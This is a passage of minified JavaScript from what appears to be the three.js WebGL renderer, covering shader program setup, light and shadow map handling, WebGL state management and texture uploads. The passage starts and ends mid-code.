sMap:!!t.roughnessMap,metalnessMap:!!t.metalnessMap,specularMap:!!t.specularMap,alphaMap:!!t.alphaMap,gradientMap:!!t.gradientMap,sheen:!!t.sheen,combine:t.combine,vertexTangents:t.normalMap&&t.vertexTangents,vertexColors:t.vertexColors,vertexUvs:!!(t.map||t.bumpMap||t.normalMap||t.specularMap||t.alphaMap||t.emissiveMap||t.roughnessMap||t.metalnessMap||t.clearcoatNormalMap),fog:!!d,useFog:t.fog,fogExp2:d&&d.isFogExp2,flatShading:t.flatShading,sizeAttenuation:t.sizeAttenuation,logarithmicDepthBuffer:a,skinning:t.skinning&&y>0,maxBones:y,useVertexTexture:s,morphTargets:t.morphTargets,morphNormals:t.morphNormals,maxMorphTargets:e.maxMorphTargets,maxMorphNormals:e.maxMorphNormals,numDirLights:n.directional.length,numPointLights:n.point.length,numSpotLights:n.spot.length,numRectAreaLights:n.rectArea.length,numHemiLights:n.hemi.length,numDirLightShadows:n.directionalShadowMap.length,numPointLightShadows:n.pointShadowMap.length,numSpotLightShadows:n.spotShadowMap.length,numClippingPlanes:f,numClipIntersection:m,dithering:t.dithering,shadowMapEnabled:e.shadowMap.enabled&&r.length>0,shadowMapType:e.shadowMap.type,toneMapping:t.toneMapped?e.toneMapping:0,physicallyCorrectLights:e.physicallyCorrectLights,premultipliedAlpha:t.premultipliedAlpha,alphaTest:t.alphaTest,doubleSided:2===t.side,flipSided:1===t.side,depthPacking:void 0!==t.depthPacking&&t.depthPacking}},this.getProgramCode=function(t,i){var n=[];if(i.shaderID?n.push(i.shaderID):(n.push(t.fragmentShader),n.push(t.vertexShader)),void 0!==t.defines)for(var r in t.defines)n.push(r),n.push(t.defines[r]);for(var o=0;o<d.length;o++)n.push(i[d[o]]);return n.push(t.onBeforeCompile.toString()),n.push(e.gammaOutput),n.push(e.gammaFactor),n.join()},this.acquireProgram=function(i,o,a,s){for(var c,l=0,h=r.length;l<h;l++){var u=r[l];if(u.code===s){++(c=u).usedTimes;break}}return void 0===c&&(c=new Bn(e,t,s,i,o,a,n),r.push(c)),c},this.releaseProgram=function(e){if(0==--e.usedTimes){var t=r.indexOf(e);r[t]=r[r.length-1],r.pop(),e.destroy()}},this.programs=r}function zn(){var e=new WeakMap;return{get:function(t){var i=e.get(t);return void 0===i&&(i={},e.set(t,i)),i},remove:function(t){e.delete(t)},update:function(t,i,n){e.get(t)[i]=n},dispose:function(){e=new WeakMap}}}function Fn(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.program!==t.program?e.program.id-t.program.id:e.material.id!==t.material.id?e.material.id-t.material.id:e.z!==t.z?e.z-t.z:e.id-t.id}function Nn(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id-t.id}function jn(){var e=[],t=0,i=[],n=[],r={id:-1};function o(i,n,o,a,s,c){var l=e[t];return void 0===l?(l={id:i.id,object:i,geometry:n,material:o,program:o.program||r,groupOrder:a,renderOrder:i.renderOrder,z:s,group:c},e[t]=l):(l.id=i.id,l.object=i,l.geometry=n,l.material=o,l.program=o.program||r,l.groupOrder=a,l.renderOrder=i.renderOrder,l.z=s,l.group=c),t++,l}return{opaque:i,transparent:n,init:function(){t=0,i.length=0,n.length=0},push:function(e,t,r,a,s,c){var l=o(e,t,r,a,s,c);(!0===r.transparent?n:i).push(l)},unshift:function(e,t,r,a,s,c){var l=o(e,t,r,a,s,c);(!0===r.transparent?n:i).unshift(l)},sort:function(){i.length>1&&i.sort(Fn),n.length>1&&n.sort(Nn)}}}function Un(){var e=new WeakMap;function t(i){var n=i.target;n.removeEventListener("dispose",t),e.delete(n)}return{get:function(i,n){var r,o=e.get(i);return void 0===o?(r=new jn,e.set(i,new WeakMap),e.get(i).set(n,r),i.addEventListener("dispose",t)):void 0===(r=o.get(n))&&(r=new jn,o.set(n,r)),r},dispose:function(){e=new WeakMap}}}function Vn(){var e={};return{get:function(t){if(void 0!==e[t.id])return e[t.id];var i;switch(t.type){case"DirectionalLight":i={direction:new y,color:new Ne,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new f};break;case"SpotLight":i={position:new y,direction:new y,color:new Ne,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new f};break;case"PointLight":i={position:new y,color:new Ne,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new f,shadowCameraNear:1,shadowCameraFar:1e3};break;case"HemisphereLight":i={direction:new y,skyColor:new Ne,groundColor:new Ne};break;case"RectAreaLight":i={color:new Ne,position:new y,halfWidth:new y,halfHeight:new y}}return e[t.id]=i,i}}}var Hn=0;function Gn(e,t){return(t.castShadow?1:0)-(e.castShadow?1:0)}function Wn(){for(var e=new Vn,t={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},i=0;i<9;i++)t.probe.push(new y);var n=new y,r=new B,o=new B;return{setup:function(i,a,s){for(var c=0,l=0,h=0,u=0;u<9;u++)t.probe[u].set(0,0,0);var d=0,p=0,f=0,m=0,v=0,g=0,y=0,b=0,w=s.matrixWorldInverse;i.sort(Gn),u=0;for(var x=i.length;u<x;u++){var _=i[u],M=_.color,S=_.intensity,T=_.distance,E=_.shadow&&_.shadow.map?_.shadow.map.texture:null;if(_.isAmbientLight)c+=M.r*S,l+=M.g*S,h+=M.b*S;else if(_.isLightProbe)for(var A=0;A<9;A++)t.probe[A].addScaledVector(_.sh.coefficients[A],S);else if(_.isDirectionalLight){if((P=e.get(_)).color.copy(_.color).multiplyScalar(_.intensity),P.direction.setFromMatrixPosition(_.matrixWorld),n.setFromMatrixPosition(_.target.matrixWorld),P.direction.sub(n),P.direction.transformDirection(w),P.shadow=_.castShadow,_.castShadow){var C=_.shadow;P.shadowBias=C.bias,P.shadowRadius=C.radius,P.shadowMapSize=C.mapSize,t.directionalShadowMap[d]=E,t.directionalShadowMatrix[d]=_.shadow.matrix,g++}t.directional[d]=P,d++}else if(_.isSpotLight){if((P=e.get(_)).position.setFromMatrixPosition(_.matrixWorld),P.position.applyMatrix4(w),P.color.copy(M).multiplyScalar(S),P.distance=T,P.direction.setFromMatrixPosition(_.matrixWorld),n.setFromMatrixPosition(_.target.matrixWorld),P.direction.sub(n),P.direction.transformDirection(w),P.coneCos=Math.cos(_.angle),P.penumbraCos=Math.cos(_.angle*(1-_.penumbra)),P.decay=_.decay,P.shadow=_.castShadow,_.castShadow){C=_.shadow;P.shadowBias=C.bias,P.shadowRadius=C.radius,P.shadowMapSize=C.mapSize,t.spotShadowMap[f]=E,t.spotShadowMatrix[f]=_.shadow.matrix,b++}t.spot[f]=P,f++}else if(_.isRectAreaLight){(P=e.get(_)).color.copy(M).multiplyScalar(S),P.position.setFromMatrixPosition(_.matrixWorld),P.position.applyMatrix4(w),o.identity(),r.copy(_.matrixWorld),r.premultiply(w),o.extractRotation(r),P.halfWidth.set(.5*_.width,0,0),P.halfHeight.set(0,.5*_.height,0),P.halfWidth.applyMatrix4(o),P.halfHeight.applyMatrix4(o),t.rectArea[m]=P,m++}else if(_.isPointLight){if((P=e.get(_)).position.setFromMatrixPosition(_.matrixWorld),P.position.applyMatrix4(w),P.color.copy(_.color).multiplyScalar(_.intensity),P.distance=_.distance,P.decay=_.decay,P.shadow=_.castShadow,_.castShadow){C=_.shadow;P.shadowBias=C.bias,P.shadowRadius=C.radius,P.shadowMapSize=C.mapSize,P.shadowCameraNear=C.camera.near,P.shadowCameraFar=C.camera.far,t.pointShadowMap[p]=E,t.pointShadowMatrix[p]=_.shadow.matrix,y++}t.point[p]=P,p++}else if(_.isHemisphereLight){var P;(P=e.get(_)).direction.setFromMatrixPosition(_.matrixWorld),P.direction.transformDirection(w),P.direction.normalize(),P.skyColor.copy(_.color).multiplyScalar(S),P.groundColor.copy(_.groundColor).multiplyScalar(S),t.hemi[v]=P,v++}}t.ambient[0]=c,t.ambient[1]=l,t.ambient[2]=h;var L=t.hash;L.directionalLength===d&&L.pointLength===p&&L.spotLength===f&&L.rectAreaLength===m&&L.hemiLength===v&&L.numDirectionalShadows===g&&L.numPointShadows===y&&L.numSpotShadows===b||(t.directional.length=d,t.spot.length=f,t.rectArea.length=m,t.point.length=p,t.hemi.length=v,t.directionalShadowMap.length=g,t.pointShadowMap.length=y,t.spotShadowMap.length=b,t.directionalShadowMatrix.length=g,t.pointShadowMatrix.length=y,t.spotShadowMatrix.length=b,L.directionalLength=d,L.pointLength=p,L.spotLength=f,L.rectAreaLength=m,L.hemiLength=v,L.numDirectionalShadows=g,L.numPointShadows=y,L.numSpotShadows=b,t.version=Hn++)},state:t}}function qn(){var e=new Wn,t=[],i=[];return{init:function(){t.length=0,i.length=0},state:{lightsArray:t,shadowsArray:i,lights:e},setupLights:function(n){e.setup(t,i,n)},pushLight:function(e){t.push(e)},pushShadow:function(e){i.push(e)}}}function Xn(){var e=new WeakMap;function t(i){var n=i.target;n.removeEventListener("dispose",t),e.delete(n)}return{get:function(i,n){var r;return!1===e.has(i)?(r=new qn,e.set(i,new WeakMap),e.get(i).set(n,r),i.addEventListener("dispose",t)):!1===e.get(i).has(n)?(r=new qn,e.get(i).set(n,r)):r=e.get(i).get(n),r},dispose:function(){e=new WeakMap}}}function Yn(e){We.call(this),this.type="MeshDepthMaterial",this.depthPacking=3200,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.setValues(e)}function Zn(e){We.call(this),this.type="MeshDistanceMaterial",this.referencePosition=new y,this.nearDistance=1,this.farDistance=1e3,this.skinning=!1,this.morphTargets=!1,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.fog=!1,this.setValues(e)}Yn.prototype=Object.create(We.prototype),Yn.prototype.constructor=Yn,Yn.prototype.isMeshDepthMaterial=!0,Yn.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.depthPacking=e.depthPacking,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this},Zn.prototype=Object.create(We.prototype),Zn.prototype.constructor=Zn,Zn.prototype.isMeshDistanceMaterial=!0,Zn.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.referencePosition.copy(e.referencePosition),this.nearDistance=e.nearDistance,this.farDistance=e.farDistance,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this};function Qn(e,t,i){var n=new ei,r=new f,o=new f,a=new T,s=[],c=[],l={},h={0:1,1:0,2:2},u=new Vt({defines:{SAMPLE_RATE:.25,HALF_SAMPLE_RATE:1/8},uniforms:{shadow_pass:{value:null},resolution:{value:new f},radius:{value:4}},vertexShader:"void main() {\n\tgl_Position = vec4( position, 1.0 );\n}",fragmentShader:"uniform sampler2D shadow_pass;\nuniform vec2 resolution;\nuniform float radius;\n#include <packing>\nvoid main() {\n  float mean = 0.0;\n  float squared_mean = 0.0;\n  \n\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy  ) / resolution ) );\n  for ( float i = -1.0; i < 1.0 ; i += SAMPLE_RATE) {\n    #ifdef HORIZONAL_PASS\n      vec2 distribution = decodeHalfRGBA ( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( i, 0.0 ) * radius ) / resolution ) );\n      mean += distribution.x;\n      squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;\n    #else\n      float depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0,  i )  * radius ) / resolution ) );\n      mean += depth;\n      squared_mean += depth * depth;\n    #endif\n  }\n  mean = mean * HALF_SAMPLE_RATE;\n  squared_mean = squared_mean * HALF_SAMPLE_RATE;\n  float std_dev = pow( squared_mean - mean * mean, 0.5 );\n  gl_FragColor = encodeHalfRGBA( vec2( mean, std_dev ) );\n}"}),d=u.clone();d.defines.HORIZONAL_PASS=1;var p=new dt;p.addAttribute("position",new Xe(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));var m=new Lt(p,u),v=this;function g(i,n){var r=t.update(m);u.uniforms.shadow_pass.value=i.map.texture,u.uniforms.resolution.value=i.mapSize,u.uniforms.radius.value=i.radius,e.setRenderTarget(i.mapPass),e.clear(),e.renderBufferDirect(n,null,r,u,m,null),d.uniforms.shadow_pass.value=i.mapPass.texture,d.uniforms.resolution.value=i.mapSize,d.uniforms.radius.value=i.radius,e.setRenderTarget(i.map),e.clear(),e.renderBufferDirect(n,null,r,d,m,null)}function y(e,t,i){var n=e<<0|t<<1|i<<2,r=s[n];return void 0===r&&(r=new Yn({depthPacking:3201,morphTargets:e,skinning:t}),s[n]=r),r}function b(e,t,i){var n=e<<0|t<<1|i<<2,r=c[n];return void 0===r&&(r=new Zn({morphTargets:e,skinning:t}),c[n]=r),r}function w(t,i,n,r,o,a){var s=t.geometry,c=null,u=y,d=t.customDepthMaterial;if(!0===n.isPointLight&&(u=b,d=t.customDistanceMaterial),void 0===d){var p=!1;!0===i.morphTargets&&(!0===s.isBufferGeometry?p=s.morphAttributes&&s.morphAttributes.position&&s.morphAttributes.position.length>0:!0===s.isGeometry&&(p=s.morphTargets&&s.morphTargets.length>0));var f=!1;!0===t.isSkinnedMesh&&(!0===i.skinning?f=!0:console.warn("THREE.WebGLShadowMap: THREE.SkinnedMesh with material.skinning set to false:",t)),c=u(p,f,!0===t.isInstancedMesh)}else c=d;if(e.localClippingEnabled&&!0===i.clipShadows&&0!==i.clippingPlanes.length){var m=c.uuid,v=i.uuid,g=l[m];void 0===g&&(g={},l[m]=g);var w=g[v];void 0===w&&(w=c.clone(),g[v]=w),c=w}return c.visible=i.visible,c.wireframe=i.wireframe,c.side=3===a?null!==i.shadowSide?i.shadowSide:i.side:null!==i.shadowSide?i.shadowSide:h[i.side],c.clipShadows=i.clipShadows,c.clippingPlanes=i.clippingPlanes,c.clipIntersection=i.clipIntersection,c.wireframeLinewidth=i.wireframeLinewidth,c.linewidth=i.linewidth,!0===n.isPointLight&&!0===c.isMeshDistanceMaterial&&(c.referencePosition.setFromMatrixPosition(n.matrixWorld),c.nearDistance=r,c.farDistance=o),c}function x(i,r,o,a,s){if(!1!==i.visible){if(i.layers.test(r.layers)&&(i.isMesh||i.isLine||i.isPoints)&&(i.castShadow||i.receiveShadow&&3===s)&&(!i.frustumCulled||n.intersectsObject(i))){i.modelViewMatrix.multiplyMatrices(o.matrixWorldInverse,i.matrixWorld);var c=t.update(i),l=i.material;if(Array.isArray(l))for(var h=c.groups,u=0,d=h.length;u<d;u++){var p=h[u],f=l[p.materialIndex];if(f&&f.visible){var m=w(i,f,a,o.near,o.far,s);e.renderBufferDirect(o,null,c,m,i,p)}}else if(l.visible){m=w(i,l,a,o.near,o.far,s);e.renderBufferDirect(o,null,c,m,i,null)}}for(var v=i.children,g=0,y=v.length;g<y;g++)x(v[g],r,o,a,s)}}this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=1,this.render=function(t,s,c){if(!1!==v.enabled&&(!1!==v.autoUpdate||!1!==v.needsUpdate)&&0!==t.length){var l=e.getRenderTarget(),h=e.getActiveCubeFace(),u=e.getActiveMipmapLevel(),d=e.state;d.setBlending(0),d.buffers.color.setClear(1,1,1,1),d.buffers.depth.setTest(!0),d.setScissorTest(!1);for(var p=0,f=t.length;p<f;p++){var m=t[p],y=m.shadow;if(void 0!==y){r.copy(y.mapSize);var b=y.getFrameExtents();if(r.multiply(b),o.copy(y.mapSize),(r.x>i||r.y>i)&&(console.warn("THREE.WebGLShadowMap:",m,"has shadow exceeding max texture size, reducing"),r.x>i&&(o.x=Math.floor(i/b.x),r.x=o.x*b.x,y.mapSize.x=o.x),r.y>i&&(o.y=Math.floor(i/b.y),r.y=o.y*b.y,y.mapSize.y=o.y)),null===y.map&&!y.isPointLightShadow&&3===this.type){var w={minFilter:1006,magFilter:1006,format:1023};y.map=new E(r.x,r.y,w),y.map.texture.name=m.name+".shadowMap",y.mapPass=new E(r.x,r.y,w),y.camera.updateProjectionMatrix()}if(null===y.map){w={minFilter:1003,magFilter:1003,format:1023};y.map=new E(r.x,r.y,w),y.map.texture.name=m.name+".shadowMap",y.camera.updateProjectionMatrix()}e.setRenderTarget(y.map),e.clear();for(var _=y.getViewportCount(),M=0;M<_;M++){var S=y.getViewport(M);a.set(o.x*S.x,o.y*S.y,o.x*S.z,o.y*S.w),d.viewport(a),y.updateMatrices(m,c,M),n=y.getFrustum(),x(s,c,y.camera,m,this.type)}y.isPointLightShadow||3!==this.type||g(y,c)}else console.warn("THREE.WebGLShadowMap:",m,"has no shadow.")}v.needsUpdate=!1,e.setRenderTarget(l,h,u)}}}function $n(e,t,i,n){n.isWebGL2;var r=new function(){var t=!1,i=new T,n=null,r=new T(0,0,0,0);return{setMask:function(i){n===i||t||(e.colorMask(i,i,i,i),n=i)},setLocked:function(e){t=e},setClear:function(t,n,o,a,s){!0===s&&(t*=a,n*=a,o*=a),i.set(t,n,o,a),!1===r.equals(i)&&(e.clearColor(t,n,o,a),r.copy(i))},reset:function(){t=!1,n=null,r.set(-1,0,0,0)}}},o=new function(){var t=!1,i=null,n=null,r=null;return{setTest:function(e){e?B(2929):D(2929)},setMask:function(n){i===n||t||(e.depthMask(n),i=n)},setFunc:function(t){if(n!==t){if(t)switch(t){case 0:e.depthFunc(512);break;case 1:e.depthFunc(519);break;case 2:e.depthFunc(513);break;case 3:e.depthFunc(515);break;case 4:e.depthFunc(514);break;case 5:e.depthFunc(518);break;case 6:e.depthFunc(516);break;case 7:e.depthFunc(517);break;default:e.depthFunc(515)}else e.depthFunc(515);n=t}},setLocked:function(e){t=e},setClear:function(t){r!==t&&(e.clearDepth(t),r=t)},reset:function(){t=!1,i=null,n=null,r=null}}},a=new function(){var t=!1,i=null,n=null,r=null,o=null,a=null,s=null,c=null,l=null;return{setTest:function(e){t||(e?B(2960):D(2960))},setMask:function(n){i===n||t||(e.stencilMask(n),i=n)},setFunc:function(t,i,a){n===t&&r===i&&o===a||(e.stencilFunc(t,i,a),n=t,r=i,o=a)},setOp:function(t,i,n){a===t&&s===i&&c===n||(e.stencilOp(t,i,n),a=t,s=i,c=n)},setLocked:function(e){t=e},setClear:function(t){l!==t&&(e.clearStencil(t),l=t)},reset:function(){t=!1,i=null,n=null,r=null,o=null,a=null,s=null,c=null,l=null}}},s={},c=null,l=null,h=null,u=null,d=null,p=null,f=null,m=null,v=null,g=null,y=!1,b=null,w=null,x=null,_=null,M=null,S=e.getParameter(35661),E=!1,A=0,C=e.getParameter(7938);-1!==C.indexOf("WebGL")?(A=parseFloat(/^WebGL\ ([0-9])/.exec(C)[1]),E=A>=1):-1!==C.indexOf("OpenGL ES")&&(A=parseFloat(/^OpenGL\ ES\ ([0-9])/.exec(C)[1]),E=A>=2);var P=null,L={},R=new T,k=new T;function O(t,i,n){var r=new Uint8Array(4),o=e.createTexture();e.bindTexture(t,o),e.texParameteri(t,10241,9728),e.texParameteri(t,10240,9728);for(var a=0;a<n;a++)e.texImage2D(i+a,0,6408,1,1,0,6408,5121,r);return o}var I={};function B(t){!0!==s[t]&&(e.enable(t),s[t]=!0)}function D(t){!1!==s[t]&&(e.disable(t),s[t]=!1)}function z(t,n,r,o,a,s,c,l){if(0!==t){if(h||(B(3042),h=!0),5===t)a=a||n,s=s||r,c=c||o,n===d&&a===m||(e.blendEquationSeparate(i.convert(n),i.convert(a)),d=n,m=a),r===p&&o===f&&s===v&&c===g||(e.blendFuncSeparate(i.convert(r),i.convert(o),i.convert(s),i.convert(c)),p=r,f=o,v=s,g=c),u=t,y=null;else if(t!==u||l!==y){if(100===d&&100===m||(e.blendEquation(32774),d=100,m=100),l)switch(t){case 1:e.blendFuncSeparate(1,771,1,771);break;case 2:e.blendFunc(1,1);break;case 3:e.blendFuncSeparate(0,0,769,771);break;case 4:e.blendFuncSeparate(0,768,0,770);break;default:console.error("THREE.WebGLState: Invalid blending: ",t)}else switch(t){case 1:e.blendFuncSeparate(770,771,1,771);break;case 2:e.blendFunc(770,1);break;case 3:e.blendFunc(0,769);break;case 4:e.blendFunc(0,768);break;default:console.error("THREE.WebGLState: Invalid blending: ",t)}p=null,f=null,v=null,g=null,u=t,y=l}}else h&&(D(3042),h=!1)}function F(t){b!==t&&(t?e.frontFace(2304):e.frontFace(2305),b=t)}function N(t){0!==t?(B(2884),t!==w&&(1===t?e.cullFace(1029):2===t?e.cullFace(1028):e.cullFace(1032))):D(2884),w=t}function j(t,i,n){t?(B(32823),_===i&&M===n||(e.polygonOffset(i,n),_=i,M=n)):D(32823)}function U(t){void 0===t&&(t=33984+S-1),P!==t&&(e.activeTexture(t),P=t)}return I[3553]=O(3553,3553,1),I[34067]=O(34067,34069,6),r.setClear(0,0,0,1),o.setClear(1),a.setClear(0),B(2929),o.setFunc(3),F(!1),N(1),B(2884),z(0),{buffers:{color:r,depth:o,stencil:a},enable:B,disable:D,getCompressedTextureFormats:function(){if(null===c&&(c=[],t.get("WEBGL_compressed_texture_pvrtc")||t.get("WEBGL_compressed_texture_s3tc")||t.get("WEBGL_compressed_texture_etc1")||t.get("WEBGL_compressed_texture_astc")))for(var i=e.getParameter(34467),n=0;n<i.length;n++)c.push(i[n]);return c},useProgram:function(t){return l!==t&&(e.useProgram(t),l=t,!0)},setBlending:z,setMaterial:function(e,t){2===e.side?D(2884):B(2884);var i=1===e.side;t&&(i=!i),F(i),1===e.blending&&!1===e.transparent?z(0):z(e.blending,e.blendEquation,e.blendSrc,e.blendDst,e.blendEquationAlpha,e.blendSrcAlpha,e.blendDstAlpha,e.premultipliedAlpha),o.setFunc(e.depthFunc),o.setTest(e.depthTest),o.setMask(e.depthWrite),r.setMask(e.colorWrite);var n=e.stencilWrite;a.setTest(n),n&&(a.setMask(e.stencilWriteMask),a.setFunc(e.stencilFunc,e.stencilRef,e.stencilFuncMask),a.setOp(e.stencilFail,e.stencilZFail,e.stencilZPass)),j(e.polygonOffset,e.polygonOffsetFactor,e.polygonOffsetUnits)},setFlipSided:F,setCullFace:N,setLineWidth:function(t){t!==x&&(E&&e.lineWidth(t),x=t)},setPolygonOffset:j,setScissorTest:function(e){e?B(3089):D(3089)},activeTexture:U,bindTexture:function(t,i){null===P&&U();var n=L[P];void 0===n&&(n={type:void 0,texture:void 0},L[P]=n),n.type===t&&n.texture===i||(e.bindTexture(t,i||I[t]),n.type=t,n.texture=i)},compressedTexImage2D:function(){try{e.compressedTexImage2D.apply(e,arguments)}catch(e){console.error("THREE.WebGLState:",e)}},texImage2D:function(){try{e.texImage2D.apply(e,arguments)}catch(e){console.error("THREE.WebGLState:",e)}},texImage3D:function(){try{e.texImage3D.apply(e,arguments)}catch(e){console.error("THREE.WebGLState:",e)}},scissor:function(t){!1===R.equals(t)&&(e.scissor(t.x,t.y,t.z,t.w),R.copy(t))},viewport:function(t){!1===k.equals(t)&&(e.viewport(t.x,t.y,t.z,t.w),k.copy(t))},reset:function(){s={},c=null,P=null,L={},l=null,u=null,b=null,w=null,r.reset(),o.reset(),a.reset()}}}function Jn(e,t,i,n,r,o,a){var s,c=r.isWebGL2,l=r.maxTextures,h=r.maxCubemapSize,u=r.maxTextureSize,d=r.maxSamples,f=new WeakMap,m="undefined"!=typeof OffscreenCanvas&&null!==new OffscreenCanvas(1,1).getContext("2d");function v(e,t){return m?new OffscreenCanvas(e,t):document.createElementNS("http://www.w3.org/1999/xhtml","canvas")}function g(e,t,i,n){var r=1;if((e.width>n||e.height>n)&&(r=n/Math.max(e.width,e.height)),r<1||!0===t){if("undefined"!=typeof HTMLImageElement&&e instanceof HTMLImageElement||"undefined"!=typeof HTMLCanvasElement&&e instanceof HTMLCanvasElement||"undefined"!=typeof ImageBitmap&&e instanceof ImageBitmap){var o=t?p.floorPowerOfTwo:Math.floor,a=o(r*e.width),c=o(r*e.height);void 0===s&&(s=v(a,c));var l=i?v(a,c):s;return l.width=a,l.height=c,l.getContext("2d").drawImage(e,0,0,a,c),console.warn("THREE.WebGLRenderer: Texture has been resized from ("+e.width+"x"+e.height+") to ("+a+"x"+c+")."),l}return"data"in e&&console.warn("THREE.WebGLRenderer: Image in DataTexture is too big ("+e.width+"x"+e.height+")."),e}return e}function y(e){return p.isPowerOfTwo(e.width)&&p.isPowerOfTwo(e.height)}function b(e,t){return e.generateMipmaps&&t&&1003!==e.minFilter&&1006!==e.minFilter}function w(t,i,r,o){e.generateMipmap(t),n.get(i).__maxMipLevel=Math.log(Math.max(r,o))*Math.LOG2E}function x(e,i){if(!1===c)return e;var n=e;return 6403===e&&(5126===i&&(n=33326),5131===i&&(n=33325),5121===i&&(n=33321)),6407===e&&(5126===i&&(n=34837),5131===i&&(n=34843),5121===i&&(n=32849)),6408===e&&(5126===i&&(n=34836),5131===i&&(n=34842),5121===i&&(n=32856)),33325===n||33326===n||34842===n||34836===n?t.get("EXT_color_buffer_float"):34843!==n&&34837!==n||console.warn("THREE.WebGLRenderer: Floating point textures with RGB format not supported. Please use RGBA instead."),n}function _(e){return 1003===e||1004===e||1005===e?9728:9729}function M(t){var i=t.target;i.removeEventListener("dispose",M),function(t){var i=n.get(t);if(void 0===i.__webglInit)return;e.deleteTexture(i.__webglTexture),n.remove(t)}(i),i.isVideoTexture&&f.delete(i),a.memory.textures--}function S(t){var i=t.target;i.removeEventListener("dispose",S),function(t){var i=n.get(t),r=n.get(t.texture);if(!t)return;void 0!==r.__webglTexture&&e.deleteTexture(r.__webglTexture);t.depthTexture&&t.depthTexture.dispose();if(t.isWebGLRenderTargetCube)for(var o=0;o<6;o++)e.deleteFramebuffer(i.__webglFramebuffer[o]),i.__webglDepthbuffer&&e.deleteRenderbuffer(i.__webglDepthbuffer[o]);else e.deleteFramebuffer(i.__webglFramebuffer),i.__webglDepthbuffer&&e.deleteRenderbuffer(i.__webglDepthbuffer);if(t.isWebGLMultiviewRenderTarget){e.deleteTexture(i.__webglColorTexture),e.deleteTexture(i.__webglDepthStencilTexture),a.memory.textures-=2;o=0;for(var s=i.__webglViewFramebuffers.length;o<s;o++)e.deleteFramebuffer(i.__webglViewFramebuffers[o])}n.remove(t.texture),n.remove(t)}(i),a.memory.textures--}var T=0;function E(e,t){var r=n.get(e);if(e.isVideoTexture&&function(e){var t=a.render.frame;f.get(e)!==t&&(f.set(e,t),e.update())}(e),e.version>0&&r.__version!==e.version){var o=e.image;if(void 0===o)console.warn("THREE.WebGLRenderer: Texture marked for update but image is undefined");else{if(!1!==o.complete)return void R(r,e,t);console.warn("THREE.WebGLRenderer: Texture marked for update but image is incomplete")}}i.activeTexture(33984+t),i.bindTexture(3553,r.__webglTexture)}function A(t,r){if(6===t.image.length){var a=n.get(t);if(t.version>0&&a.__version!==t.version){L(a,t),i.activeTexture(33984+r),i.bindTexture(34067,a.__webglTexture),e.pixelStorei(37440,t.flipY);for(var s=t&&t.isCompressedTexture,l=t.image[0]&&t.image[0].isDataTexture,u=[],d=0;d<6;d++)u[d]=s||l?l?t.image[d].image:t.image[d]:g(t.image[d],!1,!0,h);var p,f=u[0],m=y(f)||c,v=o.convert(t.format),_=o.convert(t.type),M=x(v,_);if(P(34067,t,m),s){for(d=0;d<6;d++){p=u[d].mipmaps;for(var S=0;S<p.length;S++){var T=p[S];1023!==t.format&&1022!==t.format?i.getCompressedTextureFormats().indexOf(v)>-1?i.compressedTexImage2D(34069+d,S,M,T.width,T.height,0,T.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):i.texImage2D(34069+d,S,M,T.width,T.height,0,v,_,T.data)}}a.__maxMipLevel=p.length-1}else{p=t.mipmaps;for(d=0;d<6;d++)if(l){i.texImage2D(34069+d,0,M,u[d].width,u[d].height,0,v,_,u[d].data);for(S=0;S<p.length;S++){var E=(T=p[S]).image[d].image;i.texImage2D(34069+d,S+1,M,E.width,E.height,0,v,_,E.data)}}else{i.texImage2D(34069+d,0,M,v,_,u[d]);for(S=0;S<p.length;S++){T=p[S];i.texImage2D(34069+d,S+1,M,v,_,T.image[d])}}a.__maxMipLevel=p.length}b(t,m)&&w(34067,t,f.width,f.height),a.__version=t.version,t.onUpdate&&t.onUpdate(t)}else i.activeTexture(33984+r),i.bindTexture(34067,a.__webglTexture)}}function C(e,t){i.activeTexture(33984+t),i.bindTexture(34067,n.get(e).__webglTexture)}function P(i,a,s){var 